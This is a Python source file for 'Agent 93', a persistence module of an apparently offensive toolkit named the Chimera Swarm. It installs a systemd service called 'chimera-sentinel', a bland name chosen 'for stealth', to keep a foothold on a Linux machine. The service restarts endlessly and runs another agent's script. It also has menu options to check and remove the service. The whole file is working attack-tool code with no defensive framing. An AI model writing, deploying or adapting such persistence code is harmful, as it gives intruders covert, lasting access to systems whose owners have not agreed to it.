import os
import sys
import subprocess

class PersistenceDaemon:
    """
    Chimera Agent 93: Persistence Daemon (Systemd)
    Purpose: Establish a permanent foothold on Linux systems.
    """
    def __init__(self, agent_to_persist="60_Commander_Interface"):
        self.script_dir = os.path.dirname(os.path.abspath(__file__))
        self.chimera_root = os.path.dirname(os.path.dirname(self.script_dir))
        self.target_agent_path = os.path.join(self.chimera_root, agent_to_persist, "src", "main.py")
        
        # Boring name for 'stealth'
        self.service_name = "chimera-sentinel"
        self.service_path = f"/etc/systemd/system/{self.service_name}.service"

    def create_service_file(self):
        """Builds the systemd service configuration."""
        print(f"[*] Agent 93: Drafting persistence manifest for {self.service_name}...")
        
        service_content = f"""[Unit]
Description=Chimera System Sentinel Service
After=network.target

[Service]
Type=simple
User={os.getlogin()}
WorkingDirectory={os.path.dirname(self.target_agent_path)}
ExecStart={sys.executable} {self.target_agent_path}
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
"""
        return service_content

    def deploy(self):
        """Writes the service and enables it (Requires Sudo)."""
        if os.geteuid() != 0:
            print("[!] Agent 93 Error: Persistence deployment REQUIRES sudo/root privileges.")
            return False

        try:
            content = self.create_service_file()
            
            with open(self.service_path, 'w') as f:
                f.write(content)
            
            print(f"[+] Agent 93: Service written to {self.service_path}")
            
            # Reload systemd, enable, and start
            subprocess.run(["systemctl", "daemon-reload"], check=True)
            subprocess.run(["systemctl", "enable", self.service_name], check=True)
            subprocess.run(["systemctl", "start", self.service_name], check=True)
            
            print(f"[!!!] Agent 93: PERSISTENCE ESTABLISHED. Service '{self.service_name}' is active.")
            return True
        except Exception as e:
            print(f"[!] Agent 93: Deployment failed: {e}")
            return False

    def remove_persistence(self):
        """Cleanup: Removes the persistence hook."""
        print(f"[*] Agent 93: Removing persistence for {self.service_name}...")
        try:
            subprocess.run(["systemctl", "stop", self.service_name], check=False)
            subprocess.run(["systemctl", "disable", self.service_name], check=False)
            if os.path.exists(self.service_path):
                os.remove(self.service_path)
            print("[+] Agent 93: Persistence removed.")
        except Exception as e:
            print(f"[-] Agent 93: Cleanup failed: {e}")

    def menu(self):
        print("\n" + "="*60)
        print("   AGENT 93 :: PERSISTENCE DAEMON :: CHIMERA SWARM")
        print("="*60)
        print("1. Install Persistence (Systemd Service)")
        print("2. Check Service Status")
        print("3. Uninstall/Cleanup Persistence")
        print("0. Return to Commander")
        
        choice = input("\nSelect Action > ")
        
        if choice == "1":
            self.deploy()
        elif choice == "2":
            os.system(f"systemctl status {self.service_name}")
        elif choice == "3":
            self.remove_persistence()
        elif choice == "0":
            sys.exit(0)

if __name__ == "__main__":
    daemon = PersistenceDaemon()
    daemon.menu()
